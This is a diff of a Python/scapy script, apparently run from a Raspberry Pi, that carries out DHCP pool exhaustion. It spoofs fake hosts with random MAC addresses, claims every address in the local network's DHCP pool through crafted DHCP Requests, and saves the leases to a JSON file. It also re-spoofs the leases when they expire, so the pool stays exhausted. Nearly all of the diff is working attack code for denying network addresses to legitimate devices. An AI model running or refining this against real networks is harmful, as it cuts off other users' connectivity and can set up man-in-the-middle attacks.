@@ -1,3 +1,4 @@
+# DHCP server's pool exhaustion, saving results in json file
 #### IMPORTS #### -------------------------------------------------------------------
 import scapy.all as scapy
 import time
@@ -13,13 +14,15 @@ from datetime import datetime
 
 #### CONFIG #### -------------------------------------------------------------------
 iface = "eth0"  # Network interface to spoof
-timeout_to_receive_response = 15 # Time to wait until non response is decided
+timeout_to_receive_response = 1 # Time to wait until non response is decided
+catch_and_release = False # Debug mode. Pool exhaustion + save results + Load results + Release + Save results
 json_file = "/home/pi/dhcp_starver/spoofed_hosts.json"
+log_file = "/home/pi/dhcp_starver/logs/pool_exhaustion.log"
 
 
 #### GLOBAL VARIABLES #### ---------------------------------------------------------
-# Dict of all fake hosts k:MAC, v:fake_host
-fake_host_dict = dict()
+# Dict of all spoofed ip addresses k:IP, v:fake_host
+spoofed_ip_dict = dict()
 
 # DHCP Server's IP and MAC address
 dhcp_server_ip = ""
@@ -44,7 +47,8 @@ class fake_host:
         self.hostname = "elvispresley"
         self.lease_time = None  # IP Address Lease Time offered by DHCP Server
         self.acquisition_time = None  # Time when IP Address was obtained/renewed
-        self.ip_acquired = False  # Sets if this host has adquired successfully the IP Address
+        self.is_spoofed = False  # Sets if this host has acquired successfully the IP Address
+        self.is_server = False # True when this IP address if from DHCP server's network
     def to_dict(self):
         return {
             "ip_address" : self.ip_address,
@@ -53,7 +57,8 @@ class fake_host:
             "hostname" : self.hostname,
             "lease_time" : self.lease_time,
             "acquisition_time" : self.acquisition_time.strftime("%Y-%m-%d %H:%M:%S"),
-            "ip_acquired" : self.ip_acquired
+            "is_spoofed" : self.is_spoofed,
+            "is_server" : self.is_server
         }
     @classmethod
     def from_dict(cls, data):
@@ -62,16 +67,14 @@ class fake_host:
         instance.hostname = data["hostname"]
         instance.lease_time = data["lease_time"]
         instance.acquisition_time = datetime.strptime(data["acquisition_time"], "%Y-%m-%d %H:%M:%S")
-        #ip_acquired_bool = data["ip_acquired"].lower() == "true"
-        #instance.ip_acquired = ip_acquired_bool
-        instance.ip_acquired = data["ip_acquired"]
+        instance.is_spoofed = data["is_spoofed"]
+        instance.is_server = data["is_server"]
         return instance
 
 # Define a semaphore for .log/.json file access without collision
 file_semaphore = threading.Semaphore()
 
 # Set up logging with rotation policy
-log_file = "/home/pi/dhcp_starver/logs/pool_exhaustion.log"
 handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
 handler.suffix = "%Y-%m-%d"
 handler.setLevel(logging.INFO)
@@ -149,36 +152,7 @@ def create_fake_host():
     return host
 
 
-def create_dhcp_discover_packet(host):
-    """
-    Creates a broadcast DHCP Discover with host's parameters
-    """
-    mac_address = host.mac_address
-    trans_id = host.transaction_id
-    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
-    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
-    # Making DHCP Discover packet
-    ether_header = scapy.Ether(src=host_mac, 
-                               dst="ff:ff:ff:ff:ff:ff")
-    ip_header = scapy.IP(src="0.0.0.0", 
-                         dst="255.255.255.255")
-    udp_header = scapy.UDP(sport=68, 
-                           dport=67)
-    bootp_field = scapy.BOOTP(chaddr=host_mac, 
-                              xid=trans_id,
-                              flags=0) # Unicast
-                              #flags=0x8000) # Broadcast
-    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
-                                     ("client_id", b'\x01' + host_mac),
-                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
-                                     ("hostname", host.hostname), 
-                                     "end"])
-    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
-
-    return dhcp_discover
-
-
-def create_dhcp_request_packet(host):
+def create_broadcast_dhcp_request_packet(host):
     """
     Creates a broadcast DHCP Discover with host's parameters
     """
@@ -234,11 +208,21 @@ def send_release(host_mac, ip_address):
     write_to_log(f"Releasing IP address {ip_address} from {host_mac}")
 
 
+def is_this_mac_spoofed(mac):
+    """
+    Retuns True if mac address is from an spoofed host
+    """
+    for _, host in spoofed_ip_dict.items():
+        if host.mac_address == mac:
+            return True
+    return False
+
+
 def handle_dhcp_request_response(packet):
     """
     Handles response to DHCP Request packet
     """
-    global fake_host_dict
+    global spoofed_ip_dict
     global dhcp_server_ip, dhcp_server_mac
     
     # Option 5: DHCP ACK, IP address successfully linked to host by router's DHCP server        
@@ -247,15 +231,15 @@ def handle_dhcp_request_response(packet):
         host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
         host_ip = packet[scapy.BOOTP].yiaddr
         # Check if packet is not for us. Only captured if device is connected to a mirror port or broadcast ACK
-        if host_mac not in fake_host_dict or host_mac == our_mac_address:
+        if not is_this_mac_spoofed(host_mac) or host_mac == our_mac_address:
             write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
             return None
         # Updating the fake host's attributes with DHCP server's final decision
         dhcp_opts = get_dhcp_options(packet)
-        fake_host_dict[host_mac].ip_address = host_ip
-        fake_host_dict[host_mac].lease_time = dhcp_opts['lease_time']
-        fake_host_dict[host_mac].acquisition_time = datetime.now()
-        fake_host_dict[host_mac].ip_acquired = True
+        spoofed_ip_dict[host_ip].ip_address = host_ip
+        spoofed_ip_dict[host_ip].lease_time = dhcp_opts['lease_time']
+        spoofed_ip_dict[host_ip].acquisition_time = datetime.now()
+        spoofed_ip_dict[host_ip].is_spoofed = True
         # Updating DHCP server's params
         dhcp_server_ip = dhcp_opts["server_id"] 
         dhcp_server_mac = packet[scapy.Ether].src
@@ -299,12 +283,12 @@ def remove_unused_fake_hosts():
     Removes fake hosts with no IP address assigned by DHCP Server
     """
     host_to_remove = []
-    global fake_host_dict
-    for mac, fake_host in fake_host_dict.items():
-        if not fake_host.ip_acquired:
-            host_to_remove.append(mac)
-    for mac in host_to_remove:
-        del fake_host_dict[mac]
+    global spoofed_ip_dict
+    for ip, fake_host in spoofed_ip_dict.items():
+        if not fake_host.is_spoofed:
+            host_to_remove.append(ip)
+    for ip in host_to_remove:
+        del spoofed_ip_dict[ip]
 
 
 def pool_exhaustion_with_request(ip_list):
@@ -315,9 +299,9 @@ def pool_exhaustion_with_request(ip_list):
         # Create a new ficticious host and adds it to the dictionary
         fake_host = create_fake_host()
         fake_host.ip_address = ip
-        fake_host_dict[fake_host.mac_address] = fake_host
+        spoofed_ip_dict[ip] = fake_host
         # Create Broadcast DHCP packet
-        dhcp_request_packet = create_dhcp_request_packet(fake_host)
+        dhcp_request_packet = create_broadcast_dhcp_request_packet(fake_host)
         # Sends packet and wait to response
         scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
         write_to_log(f"Request sent: {fake_host.mac_address} requesting {ip}")
@@ -327,16 +311,20 @@ def pool_exhaustion_with_request(ip_list):
         if dhcp_response:
             handle_dhcp_request_response(dhcp_response[0])
         else:
-            write_to_log(f"Timeout expired: Non response received")
+            write_to_log(f"Timeout exceeded: Non response received")
 
-            
+       
 def release_all_ips():
     """
     Sends a DHCP Release for every fake host with an IP address linked
     """
-    for host in fake_host_dict.values():
-        if host.ip_acquired:
-            send_release(host.mac_address, host.ip_address)
+    write_to_log(f"Releasing all spoofed IP addresses:")
+    global spoofed_ip_dict
+    for ip, host in spoofed_ip_dict.items():
+        if host.is_spoofed:
+            send_release(host.mac_address, ip)
+            # Updating spoofed host's dict
+            spoofed_ip_dict[ip].is_spoofed = False
             time.sleep(0.25)
     write_to_log(f"All IP addresses have been released!")
     
@@ -346,24 +334,98 @@ def load_from_json(file_path):
     Load json file contents to a dictionary
     """
     # Load json contents to a dictionary
+    write_to_log(f"Loading results from {file_path}")
     with file_semaphore:
-        with open(file_path, 'r') as json_file:
-            data = json.load(json_file)
+        with open(file_path, 'r') as file:
+            data = json.load(file)
     # Create fake_host dict with fake_host objects
-    fake_host_dict = {}
-    for mac, host_data in data.items():
-        fake_host_dict[mac] = fake_host.from_dict(host_data)
-    return fake_host_dict
+    spoofed_host_dict = {}
+    for ip, host_data in data.items():
+        spoofed_host_dict[ip] = fake_host.from_dict(host_data)
+    return spoofed_host_dict
 
 
-def save_results_to_json(results, file_path):
+def save_to_json(results, file_path):
     """
     Saves fake_host dictionary to a json file
     """
-    serializable_dict = {mac: host.to_dict() for mac, host in results.items()}
+    serializable_dict = {ip: host.to_dict() for ip, host in results.items()}
     with file_semaphore:
-        with open(file_path, 'w') as json_file:
-            json.dump(serializable_dict, json_file, indent=4)
+        with open(file_path, 'w') as file:
+            json.dump(serializable_dict, file, indent=4)
+    write_to_log(f"Results saved in {file_path}")
+
+
+def check_if_spoof_is_needed(available_hosts):
+    """
+    Checks IP acquisition time to decide if spoof is needed. 
+    Retuns a list of IP addresses to be spoofed.
+    """
+    global spoofed_ip_dict
+    try:
+        write_to_log(f"Checking if host spoof is expired:")
+        spoofed_ip_dict = load_from_json(json_file)
+    except FileNotFoundError:
+        write_to_log(f"File not found: {json_file}")
+        spoofed_ip_dict = {}
+    except json.JSONDecodeError as e:
+        write_to_log(f"Error decoding JSON file: {e}")
+        spoofed_ip_dict = {}
+    try:
+        time_now = datetime.now()
+        # List of IP addresses already spoofed
+        spoofed_ip_addresses = []
+        # List of fake_host's IP address with an out of date spoof
+        hosts_with_expired_spoof = []
+        for ip, host in spoofed_ip_dict.items():
+            # Comparing acquisition time to time now
+            time_diff = (time_now - host.acquisition_time).total_seconds()
+            if time_diff > host.lease_time or not host.is_spoofed:
+                # Making sure it's not DHCP server
+                if not host.is_server:
+                    # Spoof is needed. Adding IP address to list
+                    hosts_with_expired_spoof.append(ip)
+            else:
+                # Spoof for this IP address is not needed. Adding its IP address to list
+                spoofed_ip_addresses.append(host.ip_address)
+        # Removing expired spoofed host from dictionary
+        if hosts_with_expired_spoof:
+            write_to_log(f"IP addresses that need re-spoofing:")
+            for ip in hosts_with_expired_spoof:
+                write_to_log(f"{spoofed_ip_dict[ip].ip_address}")
+                del spoofed_ip_dict[ip]
+        else:
+            write_to_log(f"Already spoofed IP addresses are up to date. Skypping that addresses on exhaustion")
+        # Removing spoofed IP addresses from avalaible_host list to spoof
+        if spoofed_ip_addresses:
+            available_hosts = [ip for ip in available_hosts if ip not in spoofed_ip_addresses]
+  
+    except Exception as e:
+        write_to_log(f"Error during spoof need checking: {e}")
+    finally:
+        return available_hosts
+
+
+def update_json_file(updated_ip_dict, file_path):
+        """
+        Update json file with new information. Load + Update + Save
+        """
+        try:
+            dict_on_file = load_from_json(file_path)
+        except FileNotFoundError:
+            write_to_log(f"File not found: {file_path}")
+            dict_on_file = {}
+        except json.JSONDecodeError as e:
+            write_to_log(f"Error decoding JSON file: {e}")
+            dict_on_file = {}
+        for ip, host in updated_ip_dict.items():
+            #if ip in dict_on_file:
+                # If host exists, updating it's info
+            #    dict_on_file[ip] = host       
+            dict_on_file[ip] = host   
+        # Save updated dict to file
+        save_to_json(dict_on_file, file_path)
+
 
 def main():
 
@@ -372,36 +434,40 @@ def main():
     global our_ip_address, our_mac_address, our_netmask, our_network
     our_ip_address, our_mac_address, our_netmask, our_network = get_network_params(iface)
     write_to_log(f"Interface {iface} has IPaddr: {our_ip_address}, MACaddr: {our_mac_address} and netmask: {our_netmask}")
-
     # Getting all host avalaible IP addresses for network
-    avalaible_hosts = get_hosts_from_network(our_ip_address, our_netmask)
+    available_hosts = get_hosts_from_network(our_ip_address, our_netmask)
+    # Check previous spoofed host in json file to decide if pool exhaustion is needed for every existing ip address on network
+    ip_list_to_spoof = check_if_spoof_is_needed(available_hosts)
     
     try:
         # Pool exhaustion: getting all avalaible IP from DHCP server's pool
         write_to_log(f"Starting DHCP Pool exhaustion")
-        pool_exhaustion_with_request(avalaible_hosts)
+        pool_exhaustion_with_request(ip_list_to_spoof)
         write_to_log(f"Pool exhaustion completed")
         # Removing unspoofed hosts
         remove_unused_fake_hosts()
-        # Saving spoofed hosts info to json file
-        global fake_host_dict
-        save_results_to_json(fake_host_dict, json_file)
-        write_to_log(f"Results saved in {json_file}")
-    
-        #time.sleep(20)
-        #fake_host_dict.clear()
-        #fake_host_dict = load_from_json(json_file)
-        #write_to_log(f"Data loaded from {json_file}")
 
+        # Updating json file with updated host information
+        global spoofed_ip_dict
+        update_json_file(spoofed_ip_dict, json_file)
+        #save_to_json(spoofed_ip_dict, json_file)
+
+        # If True releases all ip addresses 
+        if catch_and_release:
+            time.sleep(5)
+            #global spoofed_ip_dict
+            spoofed_ip_dict = load_from_json(json_file)
+            release_all_ips()
+            remove_unused_fake_hosts()
+            save_to_json(spoofed_ip_dict, json_file)
+    
     except Exception as e:
 
         print(e)
-        # Releasing all IP addresses
-        release_all_ips()
+        #release_all_ips() 
 
     finally:
         
-        #release_all_ips()
         write_to_log(f"Service terminated")
     
 
@@ -409,4 +475,4 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt as e:
-        write_to_log(f"Service terminated")
+        write_to_log(f"Service manually terminated")
